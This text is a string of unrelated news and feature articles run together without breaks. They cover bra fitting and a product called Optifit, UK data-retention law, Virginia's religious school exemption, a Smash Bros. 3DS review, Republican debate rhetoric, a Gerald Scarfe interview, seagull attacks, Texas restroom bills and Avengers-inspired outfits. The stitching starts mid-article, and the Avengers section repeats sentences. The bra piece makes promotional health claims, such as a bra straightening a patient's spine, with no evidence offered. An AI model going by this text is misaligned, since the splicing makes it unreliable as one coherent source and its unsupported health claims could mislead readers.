The back band should not ride up at the back. You should be able to get two fingers underneath at the back and one at the front middle. CUPS Breasts should fit neatly into cups – breasts should not overspill or leave a gap between it and cup UNDERWIRES Bras with underwires are not suitable for growing breasts, such as when pregnant. But if you have large breasts and have evened out, then you may find them more comfortable.
Wires should never dig in or stick out. They should nestle under your breastbone and sit comfortably next to your ribcage. If they push against the ribcage, you may need a larger size.
If breasts bulge out from underneath the wires then it's possible you need a smaller back size with larger cup size.
‘All these slight but continuous maladjustments put unnecessary pressure on the diaphragm, which if you are sitting at a desk for hours each day, affect the breathing mechanism and can also be a direct link to digestion problems and Irritable Bowel Syndrome (IBS).
‘Overly tight straps not only cause skin irritations but reduce blood flow, affecting the nerves and contribute to tension headaches.'
Shirley's problems have now disappeared after she was properly fitted with a new bra called Optifit. She said it has even helped her breathe more easily.
Designed by NHS bra fitter Sue McDonald and consultant plastic surgeon Atul Khanna, the bra is fitted 'three-dimensionally'.
Conventional bra fittings involve two measurements: one around the ribcage under the bust, and another around the fullest part of the breasts.
But Optifit is based on three measurements taken with a patented elastic strap using colour, letter and number combinations to define frame, depth and volume.
Product developer Mr Khanna said that well-fitted bra could negate the need for breast-reduction surgery: 'Many women present to surgeons with back and shoulder pain, even sores or welts from straps and underwires digging into their skin.
'They blame the size of their breasts and wish for a surgical reduction.
'But in almost all of the cases I see, the problems stem from not having the right support which has, over time, led to very negative posture that is creating huge discomfort.'
Chiropractor Lorna said that she had recommended the new bra to some of her patients too.
‘One of my patients is in her seventies, suffers from arthritis and we have been working on the curvature in her spine.
'After discovering Optifit, I recommended she get measured and fitted and even I was astonished at the difference.
'By simply changing her bra, her spine straightened by a quarter of an inch, which may not sound like a lot, but in anatomical terms it is very impressive.
In April, when the European court said Britain's data retention laws breached two of our fundamental rights – the right to privacy and the right to protection of personal data – I started to lobby Labour's shadow home secretary, Yvette Cooper, as to what a possible reform might look like. With surveillance on the agenda like never before following the Guardian's publication of the Edward Snowden revelations, I thought we should draw a line in the sand.
I got no response, so I wrote again in June, this time because security and terrorism chief Charles Farr had for the first time confirmed that GCHQ was conducting the mass surveillance of every British citizen using Google, Facebook and YouTube channels.
In June the Home Office told me that it had no plans to update our data retention regulations in light of the European judgment. Either the Home Office has terrible legal advice, or they were cooking something up behind closed doors. Both should worry us.
Perhaps that is why Cooper didn't respond to my letters. But her team has clearly been busy because we now know that the three main party leaders have been engaged in secret talks to respond to the European court.
Nick Clegg, Ed Miliband and David Cameron are going to railroad surveillance laws through parliament in just three days. Apparently it doesn't have time to discuss this properly. Yet parliament went into recess a week early in May because we were told there was no need to debate further legislation. Something isn't right about representatives of the people being told by their party leaders to pass laws that they've barely read, let alone properly considered.
The bill was published in draft form a few hours ago. It's pointless attempting to scrutinise it because, thanks to the secret deal, we know it will be law by the end of next week. Yet on first look the bill only pays lip service to the European court. The judgment said the previous legislation was not "necessary and proportionate". The draft bill does use these words, but it's barely a nod to the court's requirements. The judgment said clearly that the mass retention of the data of every citizen was not proportionate. This legislation ignores this, allowing its retention for 12 months.
The bill says that new regulations may be passed to restrict the use of retention notices, but these are not set out. And these new restrictions won't be passed by all parliamentarians but as statutory instruments through small committees of a select few MPs.
There is a tiny amendment to section 5 of the Regulation of Investigatory Powers Act, presumably inserted to save the blushes of those Liberal Democrat MPs who stood on a manifesto to reduce state surveillance. Never mind the coalition agreement committed to reducing the unnecessary storage of our emails and internet records, this will do little to alter the balance – and in fact the law's scope will be enhanced by new provisions for warrants on people outside the UK.
While the Lib Dems can spin as much as they like that this isn't the draft communications data bill, this is clearly a light version of it which ignores the ruling of a court on fundamental rights and extends surveillance powers overseas. The party spent the day crowing about the concessions granted to civil liberties groups such as Don't Spy on Us, but the concessions aren't even in the bill. We have to trust this government to deliver these concessions. Is this a game we should be willing to play?
Yet the details are irrelevant. A secret deal between elites has removed the possibility of parliamentary scrutiny and engagement with civic society. The bill, warts and all, will be law next week. Theresa May has in the past stood strongly for the idea of policing by consent. What a shame she doesn't think the same principles apply to our security services.
The party leaders will get their way next week, but the price will be further erosion of the authority of our political institutions. Today parliament feels a little further away from our citizens.

HERE IS what is required of parents who receive a religious exemption in Virginia to keep their children out of public school: nothing.
Unlike parents who home-school their children as an educational alternative, families who opt out of public schools for religious reasons don't have to provide any evidence that they are qualified to give instruction. They don't have to report what subjects they will teach or,significantly, demonstrate that their children are learning. Virginia's law frees them from any legal obligation to educate their children. Ever.
Lest you think we are overdramatizing the shortcomings of this misguided law, just talk to Josh Powell . He decided to go public with the story of his troubled schooling because he wants people, in particular state lawmakers with the power to change the law, to know the problems are not hypothetical.
“There were all these things that are part of this common collective of knowledge that 99 percent of people have that I didn't have,” Mr. Powell, now 21, told The Post's Susan Svrluga. The gaps in his education prompted his unsuccessful fight to enroll in his local high school. Mr. Powell eventually went to community college and is now a student at Georgetown University, but he thinks he would have been further along if he hadn't had to spend so much time and energy catching up. In wanting to put “a face on the problem,” Mr. Powell told us he was thinking not just of his brothers and sisters still at home — who, to his mind, are not getting adequate schooling — but also of the nearly 7,000 Virginia children whose parents have received religious exemptions from the state's compulsory school attendance law.
Virginia is the only state that frees families from any government oversight once a religious exemption is granted. This was highlighted in a report released last September by the University of Virginia School of Law's Child Advocacy Clinic. The report, while recognizing the need to protect the rights of families to practice their religion and beliefs, pointed out the flaws of a law that subjugates the independent interests of a child in his or her education, also a fundamental right, to the beliefs of the parent. The exemptions are regularly granted by Virginia school officials who dare not ask a lot of questions, don't consider the pupil's wishes (as the law specifies) and, once an exemption is in place, rarely check on a student's progress or welfare. “It appears that the educational fates of a vast majority of exempted students are unknown to anyone but the families themselves,” said the report. It quoted a school administrator who said these students are “out of sight, out of mind.”
That, as Mr. Powell's story so powerfully demonstrated, is unacceptable. States have an interest and an obligation to see that children get a basic education; that's why we have compulsory attendance laws. By writing such a broad exemption, Virginia has tipped the scales that balance a parent's religious freedom with a child's right to an education. When the Virginia General Assembly returns for its next session, it should right that balance. Like other states, Virginia can accommodate religious concerns while still asking families to adhere to the reasonable reporting requirements of its home instruction laws.
The latest Super Smash Bros. game features just about everything you would expect from the series. The roster of characters is absurdly huge, featuring everyone from series mainstays like Mario and Link to new characters like Pac-Man and even the ghostly trainer from Wii Fit. You'll be fighting across stages pulled from Nintendo's rich history, including a green-hued stage that looks like a Game Boy and Mario Kart's infamous Rainbow Road. There's a whole bunch of modes to play through, both solo and with friends, and at the end of the game you still fight that weird giant hand.
But the newest Smash Bros. differs from past games in one key regard: it's on a handheld device for the very first time (a Wii U version is expected later this year). It sounds like a huge change — but Smash Bros. feels remarkably fun and familiar despite the move to the 3DS.
If, somehow, you've never played a Smash Bros. game, the concept is simple: characters from virtually every Nintendo franchise, from The Legend of Zelda to Pokémon, duke it out in four- person fights. Smash Bros.' key strength is its insanity, as the battles are so fast and frantic that it can be hard to tell what's even happening at times. Items like laser guns and fire swords are dropped into the middle of the battle to keep things interesting, and many of the stages change over time, forcing you to keep focused on more than just your opponents.
It feels remarkably fun and familiar
The new Smash Bros follows in the grand tradition of Nintendo games by only slightly tweaking the tried-and-true formula. You can still play normal matches alone, with friends locally, or online, and there are modes that throw you up against crazy obstacles like defeating 100 Miis without dying. The 3DS even adds a fun exclusive mode called Smash Run, where you spend five minutes fighting through a side-scrolling level collecting power-ups, which you then use in a big final fight. In short, there's a lot to do. As always, the game provides a nice balance between single and multi-player content: it's most fun to play with three friends, but you'll want to venture through the different modes yourself to unlock all of the characters, stages, and other assorted goodies.
The amazing thing is that it feels just like the Smash Bros. millions know and love, dating back to the Nintendo 64 original. The smaller screen doesn't detract from the action; characters can get pretty tiny when it's really zoomed out, but it's all perfectly manageable. I'm far from an expert — just ask the Japanese players who already have the game, and routinely destroyed me in online play — but never once did I have an issue with the controls. Competitive Smash Bros. players may disagree, but for me it all just felt right even without a Gamecube controller. For me, Smash Bros. is all about those tense moments at the end, with two players desperately holding on for dear life, and those still exist on the 3DS. They're just a bit smaller.
The conflict between complexity and approachability has always been part of the series. Smash Bros. is incredibly deep, with some characters that take a long time to learn, and a pace of play that rewards those who understand every element of the game. But, like Mario Kart, it's also remarkably accessible: you don't have to be a fighting game nerd to pick your favorite Nintendo character and have fun beating the crap out of your buddies.
But with the 3DS version of the game, Nintendo has taken more steps to ensure that the hardcore are happy. The biggest nod to the burgeoning competitive Smash Bros. scene is the ability to customize characters. You can build a Mii from scratch and outfit it with clothes you've unlocked while playing, as well as equip it with the special moves best suited to your play style. You basically get to make your own fighter from scratch. The same goes for the Nintendo characters: while you can't change the way Captain Falcon or Princess Peach looks, you can equip them with items that influence traits like strength and speed, as well as switch up their movesets. Smash Bros. already has an insanely huge cast of characters to choose from, but the new customization feature means that it's virtually impossible not to find the perfect fighter for you.
You basically get to make your own fighter from scratch
Nintendo did a fantastic job in bringing the full Smash Bros. experience to a portable device; there's a weird thrill in being able to play a few rounds to unlock a Luigi trophy while riding on the bus. But despite how good the game is, it's missing one key feature. Like all of the best multiplayer games, Smash Bros. is at its very best when a bunch of friends are on the same couch, huddled around the same TV, yelling at each other because, man, Bowser is such a jerk. You can play locally on 3DS with friends who also own the game, but it's not quite the same. That means I'm definitely going to have to buy the Wii U version as well, whenever it does come out — luckily, this game is hard to get sick of.
When it came to the subject of helping ordinary Americans, you could almost write the lines in advance of the fourth Republican debate. Spinning his flat-tax plan on Tuesday night, Senator Ted Cruz argued that tax cuts hugely weighted toward the rich will unleash such massive growth that everyone will benefit. “The effect of that is incredible economic growth," he said. "It means every income group will see double-digit increases, from the very poorest to the very weakest, of at least 14 percent." Gosh, where have we heard that before?
But there was also a new twist to the old logic: Don't just give the rich a big tax break, but also lower wages for the poor. Having vowed to be less contentious than CNBC's moderators, the moderators from Fox Business Network began the fourth Republican debate by dangling a progressive priority in front of the candidates: the $15 minimum wage. The candidates predictably rejected the wage hike, which even Hillary Clinton think goes too far. But in doing so, they actually pushed the GOP consensus even farther to the right, arguing that wages in the U.S. are actually too generous.
“Taxes too high, wages too high, we're not going to be able to compete against the world. I hate to say it, but we have to leave it the way it is,” Donald Trump said.
You could give Trump the benefit of the doubt and assume that he was just using simplistic rhetoric to say that future wage hikes aren't a good idea. But Ben Carson took the idea and really ran with it, declaring that lower wages would actually reduce high unemployment within poor communities. “Every time we raise the minimum wage, the number of jobless people increases," Carson said. "It's particularly a problem in the black community. Only 19.8 percent of black teenagers have a job, who are looking for one. You know that—and that's because of those high wages. If you lower those wages, that comes down.”
Carson's apocalyptic claims about the minimum wage simply aren't true: While there's mixed evidence on the relationship between minimum-wage increases and job growth, it's certainly not true that every federal wage hike has depressed employment. But more disturbing was his suggestion that wages actually need to be slashed for job growth to increase and the fact that no one on stage even challenged that proposition.

“Tread on the Ku Klux Klan,” says Gerald Scarfe, as I step gingerly over what he calls his “filing system”. Computer-printed pictures of politicians, rioters and racists strew the fifth-floor studio atop his Chelsea townhouse where Britain's best-known cartoonist works pretty much all day, every day. The walls are crammed too, with mementos of a career spanning more than seven decades and several artistic incarnations: savage political caricatures, his designs for Pink Floyd's The Wall and Disney's Hercules, a Bafta award. On one side, six fresh, sharp, brilliantly brutal drawings show a porcine Donald Trump talking (literally) out of his anus, riding with the Horsemen of the Apocalypse or waving a missile in place of his genitals.
Scarfe, a dapper and sprightly 81, left The Sunday Times in June after 50 years and this week joins the Evening Standard to contribute a new Friday illustration, Scarfe's Week, to complement the daily political cartoon by Adams on the comment pages. “I am a compulsive worker,” he says, folding himself into an Eames armchair bought by his wife, the actress Jane Asher. “Drawing is what I have done all my life since I was a child: it's my way of getting my rocks off or my anxieties out. It's been nice drawing for myself for a couple of months and I can publish these [Trump drawings] later in a book but a newspaper deadline can produce things that otherwise wouldn't exist — it's that last bit of energy that's squeezed out of the toothpaste tube.”
He is a fan of Adams's work. “I admire his line and I admire his ability to get up at 6am and come up with a drawing in two hours. A daily cartoon is a very hard job to do.” We seem to be in a golden age of illustration, akin to the revolution of the Sixties when Scarfe and his sometime friend, Ralph Steadman, shook up the staid cartooning world of Giles, Trog and Vicky. “It's such a weird job to do because you are part artist and part journalist,” Scarfe muses. “But most editors realise it is a big asset to a newspaper, to have a visual joke that takes the piss out of the high and mighty. I think the cartoonist's job is to give the man in the street a broad-sweep, black-and-white picture of things, as simple as possible.”
​Scarfe first began submitting drawings to the Standard and others in the late Fifties in a bid to escape his job in his uncle's commercial art studio at the Elephant and Castle. But it wasn't until Private Eye launched in 1961 that he settled (if that's the word) into the elegantly grotesque, ferocious style that remains instantly recognisable: the swooping line that turns a nose into a stabbing beak, the deft shading that unmasks a dead-eyed dictator as a cannibal feasting on his people.
These days he is in the studio by 7am, often earlier: he listens to Radio 4's Today programme, reads three newspapers, and often works into the evening, when he'll watch one major news bulletin and Newsnight. Although he has his own website, he is a stranger to social media. “I am not computer-literate.” He draws every day, whether he has a commission or not. Is it a rage that drives him? “Yeah, over the misuse of power. But that doesn't mean I walk around in a terrible fury every day. If I feel angry about Blair and Bush I can just draw it and get it out of my system. Until the next day.”
There is more to him than journalism: a new exhibition opening at the House of Illustration in King's Cross on Friday celebrates his work in theatre, opera, television and film. “I was at a party a couple of years ago and Damian Lewis came up to me and said, ‘I was your banana',” says Scarfe. “When I started in stage design I did Orpheus in the Underworld and dressed some poor actors up as fruit: he was one of them. There is a Pygmalion thing for artists: they want to get the thing off the paper, make it-three dimensional and breathe life into it.” But it is drawing that has been his obsession and his salvation.
He was born in 1936 in St John's Wood, his father a banker and his mother a teacher, and was an only child until he was nine, when his brother was born. “I was a timid, frightened child,” he recalls. “It was wartime so I was aware my parents were anxious, and my father was away most of the time anyway in the RAF. I was a chronic asthmatic and during my childhood my parents truly thought I was going to die. There were nights I could not get my breath, I'd be heaving and gasping all night, waiting for dawn and the blackbird in our garden to start singing, because when he arrived at five in the morning we were on our way to the day, which was more tolerable.”
He missed out on most of his schooling and would instead lie in bed, sketching and making plasticine models. In 1952 he won a competition in the Eagle comic to draw an Ingersol watch, beating into second place a certain
“D Hockney of Bradford”. But even from an early age the overall tone of Scarfe's work was dark, which he thinks may be a result of his lonely, limited upbringing, or possibly of the medicines he was given: “I did take ephedrine and various heightening drugs that made you feel really high and electric.”
His father wanted him to go into banking but his lack of schooling proved a bar, so he started drawing commercial products for his uncle aged 16. In his free hours he taught himself German, educated himself about Greek and archaic art, and realised the gulf between his employment and his ambitions: “Commercial art is telling lies, and the point of being an artist is that you tell the truth. Luckily for me, Private Eye started soon after, where I was encouraged by [founders] Peter Cook, Richard Ingrams and Willie Rushton to tell a kind of ultra-truth.”
Private Eye made him a star: he was likened to Hogarth, Bosch and Brueghel for work that often had sexual overtones and was always vicious. It got him work on newspapers, and it would also publish work they wouldn't. The Times commissioned but rejected his honest and stunning sketch of a senile, decrepit Winston Churchill on his last day in the Commons: Peter Cook put it on the cover. Soon, Scarfe was subject to a bidding war between the Daily Express and the Daily Mail, which the latter won by upping their offer form £3,000 a year and a Rover to £5,000 and an E-Type Jaguar. “I thought, oh, this is how it goes in Fleet Street,” he recalls. “I've never been given a car since.”
The Mail sent him to Vietnam, where he saw the horror of college boys forced to fight for reasons they didn't understand, and was sickened by mutilated bodies in a mortuary. The Sunday Times, which he joined in 1967, sent him to the Six-Day War and to Northern Ireland, where the IRA hijacked his rental car at gunpoint. He bought his magnificent home, a stone's throw from those owned by various Rolling Stones, in the mid-Sixties. “I've met them but I couldn't say Mick's a pal,” he says. “And I couldn't afford my house now.”
He met Asher in 1971, on the valedictory trip of the Brighton Belle train to celebrate the 10th anniversary of Private Eye, in which she has shares. They married in 1981 and have three children: Rory, a publisher; Alexander, an artist, and Katie, an actress.
His collaboration with Pink Floyd began in 1974 on the album Wish You Were Here, after Roger Waters and Nick Mason both independently saw a BBC documentary he had made called A Long Drawn Out Trip. “They rang each other and said, ‘We've got to work with that guy, he's f***ing mad',” Scarfe recalls.
Most politicians would rather be drawn as slavering warthogs than not be noticed at all
He and Waters went on to create the imagery of the album, concert tour sets and the 1982 film of The Wall — the looming authority figures, fascistic marching hammers, and mournful gas-masked children. “Roger and I have the same sardonic, sarcastic attitude to the world,” he says. “We played a lot of snooker and drank a lot of Special Brew.” On Hercules, he was treated like a superstar, but fought and lost a war against cuteness with the team of animators Disney gave him. “There was one of me and 900 of them,” he grumbles.
For all the ferocity of his work and his starry connections, Scarfe lives a quiet life. “Jane has been in An American in Paris for six months so my evenings have been solitary,” he says. “So either I buy some fish and roast it, or see friends for dinner, or go to the cinema. When we are together we go to the theatre and do normal things, but we are fairly private: we don't put ourselves about much.”
In 2008 he was made a CBE and in 2011 a fossil pterosaur was named after him, because the geologist who discovered it thought it looked like his caricature of Margaret Thatcher. A model of it stands in his studio, alongside a horse's head from the Parthenon, and a photograph of David Cameron and David Davis smilingly holding up a cartoon of themselves stabbing each other in the back. Cameron later asked to buy the cartoon. This makes me wonder what effect Scarfe thinks cartoons have.
“Bugger all!” he booms. “Politicians would rather be drawn as slavering warthogs than not be noticed at all. Although if you are doing a daily cartoon like our friend [Adams] it can build up and you can have an effect.” But cartoonists draws for the readers, not the leaders. “I hope for that moment someone says, ‘That encapsulates exactly what I bloody well feel',” he says with a smile. “Though half the time they're probably saying, ‘Who's that supposed to be?'”
Gerald Scarfe: Stage and Screen is at the House of Illustration, N1 (020 3696 2020, houseofillustration.org.uk), from Friday until January 21
On Saturday, Sen. Ted Cruz, R-Texas, received several standing ovations during the speech he made at the 4th annual Western Conservative Summit in Colorado.On Sunday, he was the recipient of an even bigger prize: a victory in the conference's straw poll for the 2016 Republican presidential nomination, reports the Washington Times. Cruz garnered captured 45 percent of the 504 total votes cast by those attending the three-day Summit.John Andrews, founder of the Centennial Institute at Colorado Christian University, which hosted the event, said Cruz's riveting address could very well be the start of a journey that ends up in the White House.“We shall see what sort of crystal ball summiteers have in awarding that decisive nod to Sen. Ted Cruz, who was so magnificent from this platform,” Andrews said.Gov. Scott Walker, R-Wis., placed a distant second in the straw poll with 13 percent of the vote.Walker delivered the keynote address Friday.Third place was shared by Sen. Rand Paul, R-Ky., and former Florida Rep. Allen West with 9 percent each.West was the featured speaker at the Summit Sunday; Paul did not attend the conference.On Saturday, Cruz made it clear that for the time being, his only political aspiration at the moment is to get things done in the Senate.“At this point, 100 percent of my focus is on the U.S. Senate,” Cruz said.“And the reason is simple: The Senate's the battlefield. The Senate is where these fights are being fought.So I'm devoting my time, No. 1, to trying to stand up for free-market principles and the Constitution.”Cruz also said he's convinced there's a “real possibility for Republicans to retake the Senate and retire Harry Reid as majority leader.”One of the highlights of Cruz's speech was the introduction of Don't Fund It, a national campaign designed to put an end to Obamacare by eliminating its funding from the Sept. 30 budget resolution.Cruz also called for the end of the Internal Revenue Service, which he said would be possible by simplifying the tax code.

© Provided by PRI A visit to a traditional British seaside town is usually a fairly safe and relaxing, if uneventful way, to spend the summer.
But, in recent weeks a threat to that tranquililty has emerged. Not the weather. Not even soggy fish and chips. Something altogether more menacing: rogue seagulls.
This month, the British media has been filled with accounts of increasingly violent behavior from gangs of gulls. The Daily Telegraph warned of "killer seagulls," "more interested in blood than bacon sarnies [sandwiches]." The Daily Mail reported that "packs of birds" had begun to "target women" to get food. London's Metro had an even greater threat on its mind: Seagulls could "start killing babies if we're not careful."
And naturally there is also a backlash from pro-gull commentators. The Guardian's Patrick Barkham made the factually accurate point that "seagulls are not terrorists," for all their faults. "This war [on gulls] is a bad idea," he cautioned. Prime Minister David Cameron has even called for a Big Conversation, or national debate, on how best to combat the threat.
Then there are the victims. The first high profile case involved the death of Stig the Tortoise, a beloved family pet pecked to death by a tag-team of gulls in the sleepy town of Liskeard in Cornwell. According to owner Jan Byrne, Stig was powerless once the merciless birds had flipped him onto his back. Stig took two days to die friom beak related injuries.
Other known casualties include a Yorkshire terrier in Newquay named Roo, and a Chihuahua puppy killed in Honiton, Devon. Cornish pensioner Sue Atkinson needed hospital treatment after gulls drew blood from her scalp, and a man named Richard in Truro suffered a black eye when gulls took an interest in his breakfast. "You don't expect to be attacked by a seagull at any time," he told The Mirror, "but especially not that early in the morning." Richard declined to give his full name to the papers, no doubt fearing reprisals from the avian community.
There are genuine scientific reasons why some species of seagulls may be coming into more conflict with people. The summer is their breeding season. According to naturalist Stephen Moss, over-fishing by humans in coastal waters has also forced the endangered herring gull to move inland to seek atlternative sources of food. They have found that food in the landfills and garbage cans of modern British society.
In effect, seagulls and humans stopped competing for food at sea, and have begun to do the same on land. And it is our own similiarity to the birds which causes conflict, Moss says. "Gulls are very intelligent — they are among the most intelligent creatures on Earth," he explains. "The birds act as we do, changing their behavior with the environment, adapting to new circumstances, just as we we have over millenia. We don't like it."

A Republican Texas legislator has proposed two bills that would legalize discrimination against trans people in the state. One bill would impose criminal charges on transgender people for using restroom facilities of their expressed gender. The second bill will punish any business that allows trans people to do so.
Zack Ford at Think Progress reported that Texas State Rep. Debbie Riddle (R) wants to impose fines and jail time for any person who “enters a public restroom that is designated by a sign for members of the opposite sex of the actor” in Texas House Bill 1747.
Under Riddle's second bill, H.B. 1748, businesses will face harsh penalties for not forcing trans patrons to use facilities corresponding to their birth gender.
On her Facebook page, Riddle told the public that she's “rolling up the sleeves of my new red dress & getting to work. I have several bills I think you may like. One will protect women & children from going into a ladies restroom & finding a man who feels like he is a woman that day.”
Riddle's two bills differ in their definitions of gender. The bill aimed at fining and imprisoning trans people (H.B. 1747) says Texans must use the restrooms designated for the gender listed on their driver's license. However, the bill targeting businesses defines gender as that which is “established at the individual's birth” or “established by the individual's chromosomes.”
Some trans people in Texas can obtain accurate gender designations on their driver's licenses if they can find an amenable judge. However, the bill makes no provisions for trans youth who aren't old enough to drive.
H.B. 1748 would make it a Class A misdemeanor for any individual over the age of 13 to “enter a locker room, shower facility, or toilet facility that is designated for use by persons of a gender that is not the same gender as the individual's gender.” In Texas, Ford noted, Class A misdemeanors are punishable with fines up to $4,000 and jail time up to a year.
Furthermore, Ford wrote, “The bill also targets any ‘operator, manager, superintendent, or other person with authority over a building,' stipulating that they may not allow anyone to enter a locker room, shower facility, or toilet facility that does not match their gender.”
Anyone who violates that provision of H.B. 1478 would face “a minimum of 180 days in prison with a maximum of two years, as well a fine up to $10,000.”
Similar measure have been proposed in other states, including Arizona and Kentucky, where one Republican legislator proposed a $2,500 bounty on every trans person caught using the “wrong” restroom.

You know that tingly sensation of awe and excitement you get after seeing a truly great film? Well, besides leaving me with a serious hankering for shawarma, Marvel's The Avengers definitely gave me that oh-my-gosh-you-guys-let's-watch-that-again feeling. Its all-star cast includes Chris Evans, Robert Downey Jr., Chris Hemsworth, Mark Ruffalo, Scarlett Johansson, Jeremy Renner, Samuel L. Jackson, and Cobie Smulders.
I saw the movie last Saturday night, but I still can't stop thinking about it all: the epic battle scenes, the hilarious one-liners, the seriously sexy cast, and of course, the style! And what better way to channel my newfound obsession with comic books and superheroes than with a Geek Chic fashion post?

Know Your Geek: About The Avengers
Created by Stan Lee and Jack Kirby in 1963, The Avengers is a group of superheroes that appears in Marvel Comics publications. (As opposed to DC Comics' Justice League of America.)
(As opposed to DC Comics' Justice League of America.) Although each Avenger is powerful on his or her own, “Earth's Mightiest Heroes” assemble when they must fight “the foes no single superhero can withstand.” The original Avengers were Iron Man, Ant-man, Wasp, Thor, the Hulk, and Captain America.
The original Avengers were Iron Man, Ant-man, Wasp, Thor, the Hulk, and Captain America. Written and directed by veritable geek god Joss Whedon, The Avengers brings together a reluctant group of loners who must learn to work together in order to save the world. The Avengers Initiative consists of superheroes Captain America, Iron Man, Thor, and the Hulk and S.H.I.E.L.D. agents Black Widow and Hawkeye.
The Avengers Initiative consists of superheroes Captain America, Iron Man, Thor, and the Hulk and S.H.I.E.L.D. agents Black Widow and Hawkeye. The film has done some Hulk-level smashing of box office records: it brought in $200.3 million in its opening weekend, shattering the record previously held by Harry Potter and the Deathly Hallows: Part 2.
Outfits Inspired by The Avengers
College Fashion readers, assemble! Whether you're saving the earth, avenging the earth, or just living in it, you'll look Marvel-ous in these Avengers-inspired ensembles!
Captain America/Steve Rogers
Captain America/Steve Rogers, played by Chris Evans, is the First Avenger, born from the country's efforts to create an army of super-soldiers during World War II. To prevent weapons of mass destruction being dropped on America, he's forced to crash land his plane in the Arctic.
Discovered by S.H.I.E.L.D. after spending 70 years frozen in the ocean, he awakens in the present day only to be hit with the crushing realization that everything and everyone he knew and held dear in the 1940s is gone. The atrocities of WWII fresh in his mind, he's left cynical and disillusioned about humanity. Nevertheless, he still believes in serving the greater good and becomes the reluctant leader of the group.
Product Information: Jacket, Dress, Shoes, Earrings, Ring, Clutch
I don't think I've ever felt quite as patriotic as I did in the moment that Chris Evans first appeared onscreen in full Captain America regalia. He definitely makes the spangly suit work!
While you'd certainly turn heads if you wore a stars-and-stripes unitard to class, it might not be for quite the right reasons! Instead, channel this stalwart hero with an All-American, 1940s-inspired look that features a chambray shirtdress and brown bomber jacket. Add a modern twist with bold flag-emblazoned booties: if you're not a fan of the JC Litas, red pumps would also look cute with the outfit. Although Captain America's vibranium shield isn't available for purchase, this cute star ring is the next best thing. Retro waves are pretty and polished; plus, they're all the rage this spring!
Iron Man/Tony Stark
Iron Man/Tony Stark, played by Robert Downey Jr., is a self-described “billionaire genius playboy philanthropist.” (It's a very apt description, to be honest.) Stark is far from a team player: he's arrogant and snarky and often chafes under direction.
Despite his personality faults, it's impossible to deny his engineering genius. His origins as a superhero were explored in 2008's Iron Man and 2010's Iron Man 2. Stark, a wealthy industrialist, has an electromagnet in his chest that prevents a piece of shrapnel from penetrating his heart. The arc reactor that powers the electromagnet also powers the Iron Man suit, a metal exoskeleton that allows Stark to do things such as fly and withstand tremendous trauma.
Product Information: Blazer, Tee, Jeans, Wedges, Necklace, Bracelet, Earrings, Sunglasses
Tony Stark is all about flash and style, so make sure all eyes are on you with this bold metallic look. A sharp burgundy blazer and gold coated jeans resemble his Iron Man suit, while a charcoal burnout tee and dark sunglasses recall Tony's too-cool-for-school attitude. Sculptural wedges with a metallic detail tie the look together.
No hero's outfit is complete without accessories, so pile 'em on! A teal pendant not only provides a nice color contrast to the blazer, but also references Tony's chestplate. This silver cuff bracelet might not help you suit up, like Tony's do, but hey, it's cute!
Thor
Thor, played by Chris Hemsworth, is a demi-god of Asgard. In 2011's Thor, he was banished to Earth because of his arrogance and warmongering. Now, he returns to our planet to retrieve his renegade adopted brother, Loki, who has grandiose plans to enslave the human race. Thor has sworn to defend Earth, but at the same time is conflicted because the villain is family.
Initially, he and the other Avengers majorly clash due to misunderstanding about their mutual goal. However, he proves to be an invaluable member of the team, not only because he's more familiar with Loki's insanity, but also because he's the only one with the strength to keep the Hulk under control.
Product information: Top, Skirt, Heels, Cuffs, Earrings, Necklace, Ring, Phone case
As the god of thunder and lightning, Thor wears lots of metallics, and a silver foil tank is a trendy take on his armor. Translate his flowing garnet cloak into a trendy high-low hem skirt that pairs perfectly with black lace-up heels. I couldn't find any hammer jewelry, so go for hammered metal accessories like these twin silver cuffs and black choker necklace instead! Golden lighting bolt earrings and a horn ring reference Thor's godly background and powers.
The Incredible Hulk/Bruce Banner
Bruce Banner/Hulk, played by Mark Ruffalo, is a brilliant, mild-mannered scientist whose experiments with gamma radiation went horribly wrong. As a result, when he's angry, he mutates into “the other guy” — a giant green beast who destroys just about everything in his path. In the film, Nick Fury, director of S.H.I.E.L.D., tries to recruit Banner for his unparalleled knowledge of gamma radiation. It's been years since his other self has emerged, but Bruce is understandably reluctant to join the mission. Even if his involvement is just in a scientific capacity, he knows that any exposure to battle could cause the unleashing of the Hulk.
Product Information: Blouse, Shorts, Sandals, Necklace, Earrings, Satchel, Nail Polish
Besides a pair of practically indestructible shorts, the Hulk hasn't got much in the way of uniform. Nevertheless, you can totally channel both the not-so-jolly green giant and his more pleasant alter ego. A trendy mint blouse and lavender cut-offs are a pastel take on the Hulk's green coloring and purple pants. He goes barefoot, but you can wear minimalist two-strap sandals instead.
Radioactive earrings add a pop of trendy neon and reference the Hulk's origin. Let's not leave Bruce Banner out of the equation: add some scholarly details with a navy satchel and a spectacle necklace. Finally, add the sartorial equivalent of “Hulk…smash!” with a coat of black shatter polish!
Black Widow/Natasha Romanoff
Black Widow/Natasha Romanoff, played by Scarlett Johansson, is a former KGB assassin turned S.H.I.E.L.D. agent. Though she doesn't technically have superpowers, she's been trained as an assassin from an early age. Natasha, who made a brief appearance in Iron Man 2, has nerves of steel and some serious martial arts skills.
Product Information: Jacket, Dress, Heels, Belt, Earrings, Lipstick, Nail Polish
Since Black Widow's the only woman in the Initiative, I initially wanted to avoid an overly feminine, stereotypical outfit, but in the end, the sultry bandage dress won out. After all, ScarJo does possess famously dangerous curves and there's no denying Black Widow's major sex appeal! Toughen up the look with a sharp-shouldered leather jacket and sassy slingbacks that resemble the ones she wears at the beginning of the movie.
Accessorize with scarlet accents: black widow spiders are easily identified by the red hourglass on their midsections, so slip on a red patent belt. Then slick on a coat of crimson Hourglass lipstick and reference Natasha's mother country with Essie's “Russian Roulette” nail varnish. These spider earrings might be more reminiscent of another Marvel character, but they're also sleek enough to be Black-Widow-esque.
Hawkeye/Clint Barton
Clint Barton/Hawkeye, played by Jeremy Renner, is quite the loner: as an expert sniper, he spends a great deal of time perched in the shadows, waiting for his targets. This master marksman has got a neat set of trick arrows (acid, explosive, flare, and boomerang arrows, just to name a few). Hawkeye mostly keeps to himself, but does share a deep, unspoken connection with Black Widow. He made a cameo in Thor.
Product Information: Vest, Tank, Jeans, Boots, Bag, Ring, Necklace, Bracelet
In the original comics, Hawkeye wears a flashy purple and blue suit. While I can see why they toned it down for the movie, it's actually a pretty fun color scheme for real life. Distressed denim vests are a hot trend this year, and this one pairs perfectly with a cobalt tank and violet skinnies. Buckled ankle boots toughen up the look while a hawk ring and nest pendant add some avian detail.
